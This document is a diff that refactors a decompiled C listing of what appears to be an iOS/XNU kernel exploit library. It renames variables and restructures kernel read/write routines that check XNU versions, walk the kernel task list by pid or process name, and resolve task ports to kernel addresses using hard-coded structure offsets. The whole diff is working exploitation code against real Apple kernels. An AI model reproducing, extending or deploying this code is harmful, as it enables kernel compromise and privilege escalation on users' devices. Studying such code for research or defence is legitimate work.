@@ -231,6 +231,10 @@ __int64 __fastcall setup_macho_section_dispatch(__int64 result, __int64, int);
 __int64 __fastcall get_kernel_version_build_0(__int64 a1, __int64 a2, int a3);
 __int64 __fastcall nullsub_1(uint64_t); // weak
 __int64 __fastcall validate_kaddr_range(__int64, __int64);
+static __attribute__((noinline)) __int64 validate_kaddr_range_reloaded(__int64 ctx, __int64 addr)
+{
+  return validate_kaddr_range(ctx, addr);
+}
 unsigned __int64 __fastcall check_kaddr_in_physmap(struct_krwCtx *krwCtx, unsigned __int64 vaddr);
 typedef struct sub_197A8_result
 {
@@ -27226,8 +27230,16 @@ __int64 __fastcall setup_physmap_krw(__int64 a1, char a2)
 //----- (0000000000027808) ----------------------------------------------------
 __int64 __fastcall krw_read_validation(__int64 a1, char a2)
 {
+  enum
+  {
+    ERR_ALLOC = 708617,
+    ERR_BAD_CPU = 708628,
+    ERR_THREAD_PORT = 163848,
+    ERR_INVALID_KADDR = 163878,
+    ERR_UNSUPPORTED_XNU = 163884,
+    ERR_TIMEOUT = 2147483697,
+  };
   vm_size_t v4; // x19
-  int v5; // w8
   __int64 v6; // x21
   unsigned int v10; // w27
   kern_return_t v11; // w0
@@ -27247,7 +27259,6 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
   unsigned __int64 v25; // x0
   __int64 v26; // x27
   semaphore_t v27; // w25
-  int v28; // w8
   int v29; // w25
   __int64 v30; // x28
   __int64 v31; // x3
@@ -27306,16 +27317,19 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
 
   address = 0;
   v4 = vm_page_size;
-  v5 = *(uint32_t *)(a1 + 320);
-  v6 = 163884;
-  if ( v5 > 8791 )
+  uint32_t xnuMajor = *(uint32_t *)(a1 + 320);
+  v6 = ERR_UNSUPPORTED_XNU;
+  switch ( xnuMajor )
   {
-    if ( v5 != 8792 && v5 != 10002 && v5 != 8796 )
+    case 7195:
+    case 8019:
+    case 8020:
+    case 8792:
+    case 8796:
+    case 10002:
+      break;
+    default:
       return v6;
-  }
-  else if ( (unsigned int)(v5 - 8019) >= 2 && v5 != 7195 )
-  {
-    return v6;
   }
   if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A17) )
   {
@@ -27358,7 +27372,7 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
         v22 = pthread_mach_thread_np(v83);
         if ( v22 + 1 < 2 )
         {
-          v6 = 163848;
+          v6 = ERR_THREAD_PORT;
         }
         else
         {
@@ -27374,7 +27388,7 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
               goto LABEL_155;
             }
           }
-          v6 = 163878;
+          v6 = ERR_INVALID_KADDR;
         }
       }
     }
@@ -27395,76 +27409,52 @@ LABEL_158:
       vm_deallocate(mach_task_self_, address, v4);
     return v6;
   }
-  v12 = *(uint32_t *)(a1 + 320);
-  if ( v12 <= 8791 )
-  {
-    if ( v12 != 8019 )
-    {
-      if ( v12 == 8020 )
-      {
-        v20 = 48;
-        v21 = 9728;
-        goto LABEL_66;
-      }
-      goto LABEL_76;
-    }
-    if ( *(uint64_t *)(a1 + 344) <= XNU_VERSION_PACKED(8019, 79, 1023, 1023, 1023) )
-      v21 = 9728;
-    else
-      v21 = 9744;
-  }
-  else
-  {
-    switch ( v12 )
-    {
-      case 8792:
-        v14 = !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK);
-        v15 = 9952;
-        v16 = 9936;
-        break;
-      case 8796:
-        v20 = 48;
-        v21 = 9904;
-        goto LABEL_66;
-      case 10002:
-        v13 = *(uint64_t *)(a1 + 344);
-        v14 = !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
-        if ( v13 < XNU_VERSION_PACKED(10002, 42, 8, 0, 0) )
-        {
-          v15 = 17904;
-          v16 = 10160;
-        }
-        else
-        {
-          v15 = 17936;
-          v16 = 10192;
-        }
-        break;
-      default:
-        goto LABEL_76;
-    }
-    if ( v14 )
-      v21 = v16;
-    else
-      v21 = v15;
-  }
-  v28 = *(uint32_t *)(a1 + 320);
   v20 = 48;
-  if ( v28 > 8795 )
+  v12 = *(uint32_t *)(a1 + 320);
+  switch ( v12 )
   {
-    if ( v28 == 8796 )
+    case 8019:
+      if ( *(uint64_t *)(a1 + 344) <= XNU_VERSION_PACKED(8019, 79, 1023, 1023, 1023) )
+        v21 = 9728;
+      else
+        v21 = 9744;
+      break;
+    case 8020:
+      v21 = 9728;
       goto LABEL_66;
-    if ( v28 == 10002 )
-    {
+    case 8792:
+      if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
+        v21 = 9952;
+      else
+        v21 = 9936;
+      break;
+    case 8796:
+      v21 = 9904;
+      goto LABEL_66;
+    case 10002:
       v20 = 40;
-      goto LABEL_66;
-    }
+      v13 = *(uint64_t *)(a1 + 344);
+      v14 = !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
+      if ( v13 < XNU_VERSION_PACKED(10002, 42, 8, 0, 0) )
+      {
+        v15 = 17904;
+        v16 = 10160;
+      }
+      else
+      {
+        v15 = 17936;
+        v16 = 10192;
+      }
+      if ( v14 )
+        v21 = v16;
+      else
+        v21 = v15;
+      break;
+    default:
 LABEL_76:
-    v6 = 163884;
-    goto LABEL_158;
+      v6 = ERR_UNSUPPORTED_XNU;
+      goto LABEL_158;
   }
-  if ( (unsigned int)(v28 - 8019) >= 2 && v28 != 8792 )
-    goto LABEL_76;
 LABEL_66:
   v29 = number_of_cpus();
   v30 = (unsigned int)(v29 - 1);
@@ -27481,7 +27471,7 @@ LABEL_66:
     v34 = 0;
     goto LABEL_146;
   }
-  v6 = 708617;
+  v6 = ERR_ALLOC;
   v35 = calloc(v29, 8u);
   v34 = v35;
   if ( !v35 )
@@ -27506,7 +27496,7 @@ LABEL_142:
         v27 = 0;
         v23 = 0;
         v26 = 0;
-        v6 = 708628;
+        v6 = ERR_BAD_CPU;
         goto LABEL_146;
       }
       *((uint64_t *)v35 + v40) = v39;
@@ -27584,7 +27574,7 @@ LABEL_129:
     bzero(*((void **)v41 + 16), 8 * v55);
     if ( (mach_absolute_time() - v80) * *(unsigned int *)(a1 + 604) / *(unsigned int *)(a1 + 608) > 0x12A15343FLL )
     {
-      v6 = 2147483697LL;
+      v6 = ERR_TIMEOUT;
       goto LABEL_129;
     }
     LODWORD(v56) = *((uint32_t *)v41 + 31);
@@ -27765,7 +27755,7 @@ LABEL_155:
     if ( (uint32_t)v6 )
       goto LABEL_158;
     v78 = (__int64 *)((*(uint64_t *)(a1 + 392) & v26) + address);
-    v6 = 163878;
+    v6 = ERR_INVALID_KADDR;
     if ( !validate_kaddr_range(a1, *v78) )
       goto LABEL_158;
   }
@@ -37013,137 +37003,110 @@ __int64 __fastcall krw_task_for_pid_0(struct_krwCtx *a1, __int64 a2, int pid)
 //----- (000000000003341C) ----------------------------------------------------
 __int64 __fastcall krw_task_for_pid_or_name_ret_x0(struct_krwCtx *a1, __int64 a2, int pid, const char *a4)
 {
-  int xnuMajorVersion; // w8
-  __int64 result; // x0
-  __int64 v10; // x24
-  __int64 v11; // x25
-  int v16; // w0
-  int v17; // w23
-  int stride168; // w20
-  __int64 v19; // x0
-  unsigned __int64 base_ptr; // x26
-  __int64 size; // x8
-  __int64 v22; // x27
-  int v23; // w28
-  __int64 v24; // x23
-  unsigned __int64 v25; // x20
-  __int64 v26; // x1
-  __int64 v27; // x0
-  unsigned __int64 v28; // x0
-  __int64 v29; // x0
-  int v31; // [xsp+4h] [xbp-8Ch] BYREF
-  __int64 v32; // [xsp+8h] [xbp-88h] BYREF
-  SearchObj __s1; // [xsp+10h] [xbp-80h] BYREF
+  uint32_t xnuMajorVersion; // w8
+  uint64_t pidOffset; // x24
+  uint64_t nameOffset; // x25
+  int taskContextSize; // w0
+  uint32_t taskListNextOffset; // w23
+  uint64_t dataBase; // x26
+  uint64_t dataSize; // x8
+  uint64_t dataEnd; // x20
+  uint64_t taskListHead; // [xsp+8h] [xbp-88h] BYREF
+  int taskPid; // [xsp+4h] [xbp-8Ch] BYREF
+  SearchObj dataSegment; // [xsp+10h] [xbp-80h] BYREF
 
   xnuMajorVersion = a1->xnuMajorVersion;
-  result = 0;
+  pidOffset = 0;
+  nameOffset = 0;
   if ( a4 )
   {
     if ( xnuMajorVersion == 8792 )
-    {
-      v11 = 897;
-      v10 = 0;
-    }
+      nameOffset = 897;
+    else if ( xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
+      nameOffset = 1401;
     else
-    {
-      if ( xnuMajorVersion != 10002 && xnuMajorVersion != 8796 )
-        return result;
-      v10 = 0;
-      v11 = 1401;
-    }
+      return 0;
   }
-  else if ( xnuMajorVersion > 8791 )
+  else if ( xnuMajorVersion == 8792 || xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
   {
-    if ( xnuMajorVersion != 8792 && xnuMajorVersion != 10002 && xnuMajorVersion != 8796 )
-      return result;
-    v11 = 0;
-    v10 = 96;
+    pidOffset = 96;
+  }
+  else if ( xnuMajorVersion == 6153 || xnuMajorVersion == 7195 || (unsigned int)(xnuMajorVersion - 8019) < 2 )
+  {
+    pidOffset = 104;
   }
   else
   {
-    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 6153 && xnuMajorVersion != 7195 )
-      return result;
-    v10 = 104;
-    v11 = 0;
-  }
-  v16 = get_task_context_size((__int64)a1);
-  if ( !v16 )
     return 0;
-  v17 = v16;
-  stride168 = a1->stride168;
-  v19 = a1->gap1921[2];
-  if ( v19 )
-  {
-    macho_walk_segment_by_name("__DATA", v19, &__s1);
-    result = 0;
-    base_ptr = __s1.base_ptr;
-    if ( !__s1.base_ptr )
-      return result;
-    size = __s1.size;
-    if ( !__s1.size )
-      return result;
-    v22 = __s1.field_0x00;
   }
-  else
+
+  taskContextSize = get_task_context_size((__int64)a1);
+  if ( !taskContextSize )
+    return 0;
+
+  dataBase = 0;
+  dataSize = 0;
+  dataEnd = 0;
+  if ( a1->gap1921[2] )
   {
-    size = 0;
-    base_ptr = 0;
-    v22 = 0;
+    macho_walk_segment_by_name("__DATA", a1->gap1921[2], &dataSegment);
+    dataBase = dataSegment.base_ptr;
+    if ( !dataBase )
+      return 0;
+    dataSize = dataSegment.size;
+    if ( !dataSize )
+      return 0;
+    if ( dataSegment.field_0x00 )
+      dataEnd = dataBase + dataSize;
   }
-  v23 = 0;
-  v24 = (unsigned int)(stride168 + v17);
-  v25 = base_ptr + size;
-  while ( 2 )
+
+  taskListNextOffset = (uint32_t)(a1->stride168 + taskContextSize);
+  for ( int retry = 0; retry != 6; ++retry )
   {
-    v32 = a2;
-    v26 = a2;
-    do
+    taskListHead = a2;
+    while ( 1 )
     {
-      v27 = read_kaddr_at_task_offset((__int64)a1, v26);
-      if ( v27 )
+      uint64_t task = read_kaddr_at_task_offset((__int64)a1, taskListHead);
+      if ( task )
       {
         if ( a4 )
         {
           char buf[40];
-          if ( !(unsigned int)krw_read_thunk((__int64)a1, v27 + v11, 33, (__int64)&buf) )
+          if ( !(unsigned int)krw_read_thunk((__int64)a1, task + nameOffset, 33, (__int64)&buf) )
             return 0LL;
           if ( !strncmp((const char *)&buf, a4, 0x21u) )
-            return v32;
+            return taskListHead;
         }
         else
         {
-          if ( !(unsigned int)krw_read_thunk((__int64)a1, v27 + v10, 4, (__int64)&v31) )
+          if ( !(unsigned int)krw_read_thunk((__int64)a1, task + pidOffset, 4, (__int64)&taskPid) )
             return 0;
-          if ( v31 == pid )
-            return v32;
+          if ( taskPid == pid )
+            return taskListHead;
         }
       }
-      if ( !kread_physmap_decorated(a1, v32 + v24, &v32) )
+
+      if ( !kread_physmap_decorated(a1, taskListHead + taskListNextOffset, &taskListHead) )
         return 0;
-      v28 = validate_kaddr_range((__int64)a1, v32);
-      v32 = v28;
-      if ( !v28 )
+      taskListHead = validate_kaddr_range_reloaded((__int64)a1, taskListHead);
+      if ( !taskListHead )
         break;
-      v26 = v28;
-      if ( v22 && v28 >= base_ptr && v28 < v25 )
+
+      if ( dataEnd && taskListHead >= dataBase && taskListHead < dataEnd )
       {
-        if ( !kread_physmap_decorated(a1, v28, &v32) )
+        if ( !kread_physmap_decorated(a1, taskListHead, &taskListHead) )
           return 0;
-        v29 = validate_kaddr_range((__int64)a1, v32);
-        v32 = v29;
-        if ( !v29 )
+        taskListHead = validate_kaddr_range_reloaded((__int64)a1, taskListHead);
+        if ( !taskListHead )
           break;
-        v26 = v29;
       }
+
+      if ( taskListHead == a2 )
+        break;
     }
-    while ( v26 != a2 );
     semaphore_timedwait_ns((__int64)a1, 0x3D090u);
-    result = 0;
-    if ( ++v23 != 6 )
-      continue;
-    break;
   }
-  return result;
+  return 0;
 }
 
 //----- (00000000000336AC) ----------------------------------------------------
@@ -37219,81 +37182,73 @@ LABEL_30:
 //----- (000000000003382C) ----------------------------------------------------
 __int64 __fastcall setup_task_port_chain(__int64 a1, mach_port_name_t task, uint32_t *a3, uint32_t *a4)
 {
-  __int64 v8; // x1
-  __int64 result; // x0
-  unsigned __int64 v10; // x1
-  unsigned __int64 v11; // x0
-  __int64 v12; // x23
-  task_t v13; // w0
-  __int64 v14; // x23
-  int v15; // w8
-  __int64 v16; // x8
-  unsigned __int64 v17; // x0
-  unsigned __int64 v18; // x0
+  struct_krwCtx *ctx; // x21
+  uint64_t cachedTaskKaddr; // x1
+  uint64_t selfPortKobject; // x23
+  uint64_t taskListEntry; // x23
+  uint64_t registeredTaskPort; // x0
+  uint64_t registeredTaskPortOffset; // x8
+  uint64_t taskKaddr; // x0
   mach_port_t init_port_set; // [xsp+4h] [xbp-3Ch] BYREF
-  int pid_then_addr[2]; // [xsp+8h] [xbp-38h] BYREF
+  int pid; // [xsp+8h] [xbp-38h] BYREF
 
+  ctx = (struct_krwCtx *)a1;
   if ( mach_task_self_ == task )
   {
-    v8 = *(uint64_t *)(a1 + 416);
-    if ( v8 )
-      return read_pte_entry_chain((struct_krwCtx *)a1, v8, a3, a4);
+    cachedTaskKaddr = *(uint64_t *)(a1 + 416);
+    if ( cachedTaskKaddr )
+      return read_pte_entry_chain(ctx, cachedTaskKaddr, a3, a4);
   }
-  v10 = *(uint64_t *)(a1 + 6608);
-  if ( !v10 )
+
+  if ( !*(uint64_t *)(a1 + 6608) )
     return 0;
-  v11 = maybe_ipc_port_get_kobject((struct_krwCtx *)a1, v10);
-  if ( !v11 )
+  selfPortKobject = maybe_ipc_port_get_kobject(ctx, *(uint64_t *)(a1 + 6608));
+  if ( !selfPortKobject )
     return 0;
-  v12 = v11;
-  v13 = *(uint32_t *)(a1 + 6424);
-  if ( v13 + 1 <= 1 )
+
+  if ( *(uint32_t *)(a1 + 6424) + 1 <= 1 )
   {
-    pid_then_addr[0] = 0;
-    if ( !pid_for_task(task, pid_then_addr) )
-    {
-      v14 = krw_task_for_pid_or_name_ret_x0((struct_krwCtx *)a1, v12, pid_then_addr[0], 0);
-      if ( v14 )
-        goto LABEL_9;
-    }
-    return 0;
-  }
-  init_port_set = task;
-  if ( mach_ports_register(v13, &init_port_set, 1u) )
-    return 0;
-  v15 = *(uint32_t *)(a1 + 320);
-  if ( v15 == 6153 )
-  {
-    v16 = 776;
+    pid = 0;
+    if ( pid_for_task(task, &pid) )
+      return 0;
+    taskListEntry = krw_task_for_pid_or_name_ret_x0(ctx, selfPortKobject, pid, 0);
+    if ( !taskListEntry )
+      return 0;
   }
   else
   {
-    if ( v15 != 7195 )
+    init_port_set = task;
+    if ( mach_ports_register(*(uint32_t *)(a1 + 6424), &init_port_set, 1u) )
       return 0;
-    v16 = 792;
+
+    if ( *(uint32_t *)(a1 + 320) == 6153 )
+      registeredTaskPortOffset = 776;
+    else if ( *(uint32_t *)(a1 + 320) == 7195 )
+      registeredTaskPortOffset = 792;
+    else
+      return 0;
+
+    registeredTaskPort = 0;
+    if ( !kread_physmap_decorated(ctx, selfPortKobject + registeredTaskPortOffset, &registeredTaskPort) )
+      return 0;
+    registeredTaskPort = validate_kaddr_range_reloaded(a1, registeredTaskPort);
+    if ( !registeredTaskPort )
+      return 0;
+    taskListEntry = maybe_ipc_port_get_kobject(ctx, registeredTaskPort);
+    if ( !taskListEntry )
+      return 0;
+
+    init_port_set = 0;
+    if ( mach_ports_register(*(uint32_t *)(a1 + 6424), &init_port_set, 1u) )
+      return 0;
   }
-  if ( !kread_physmap_decorated((struct_krwCtx *)a1, v16 + v12, (unsigned __int64 *)pid_then_addr) )
+
+  taskKaddr = kreadptr(ctx, taskListEntry);
+  if ( !taskKaddr )
     return 0;
-  v17 = validate_kaddr_range(a1, *(__int64 *)pid_then_addr);
-  if ( !v17 )
-    return 0;
-  v18 = maybe_ipc_port_get_kobject((struct_krwCtx *)a1, v17);
-  if ( !v18 )
-    return 0;
-  v14 = v18;
-  init_port_set = 0;
-  if ( mach_ports_register(*(uint32_t *)(a1 + 6424), &init_port_set, 1u) )
-    return 0;
-LABEL_9:
-  result = kreadptr((struct_krwCtx *)a1, v14);
-  if ( result )
-  {
-    v8 = result;
-    if ( mach_task_self_ == task )
-      *(uint64_t *)(a1 + 416) = result;
-    return read_pte_entry_chain((struct_krwCtx *)a1, v8, a3, a4);
-  }
-  return result;
+  if ( mach_task_self_ == task )
+    *(uint64_t *)(a1 + 416) = taskKaddr;
+  return read_pte_entry_chain(ctx, taskKaddr, a3, a4);
 }
 
 //----- (00000000000339B4) ----------------------------------------------------
